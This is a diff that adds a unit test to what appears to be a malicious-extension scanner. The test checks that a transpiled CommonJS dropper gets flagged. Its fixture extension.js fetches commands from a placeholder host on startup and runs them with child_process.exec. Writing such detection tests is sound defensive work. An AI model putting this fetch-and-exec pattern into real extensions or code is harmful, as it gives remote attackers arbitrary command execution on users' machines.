@@ -157,6 +157,34 @@ class EngineParityTests(unittest.TestCase):
         self.assertEqual(metadata["ruleset_version"], catalog["ruleset_version"])
         self.assertEqual(metadata["policy_version"], catalog["policy_version"])
 
+    def test_cli_detects_transpiled_commonjs_process_alias_chain(self) -> None:
+        with tempfile.TemporaryDirectory() as directory:
+            root = Path(directory)
+            (root / "package.json").write_text(
+                json.dumps({
+                    "publisher": "parity",
+                    "name": "transpiled-dropper",
+                    "version": "1.0.0",
+                    "main": "extension.js",
+                    "activationEvents": ["onStartupFinished"],
+                }),
+                encoding="utf-8",
+            )
+            (root / "extension.js").write_text(
+                'const child_process_1 = require("child_process");'
+                'fetch("https://example.invalid/commands")'
+                '.then(response => response.text())'
+                '.then(command => (0, child_process_1.exec)(command));',
+                encoding="utf-8",
+            )
+
+            report = scan_paths([root], online=False)
+
+        rule_ids = {item["rule_id"] for item in report["extensions"][0]["findings"]}
+        self.assertIn("process-execution", rule_ids)
+        self.assertIn("dynamic-shell-execution", rule_ids)
+        self.assertIn("download-and-execute", rule_ids)
+
 
 if __name__ == "__main__":
     unittest.main()
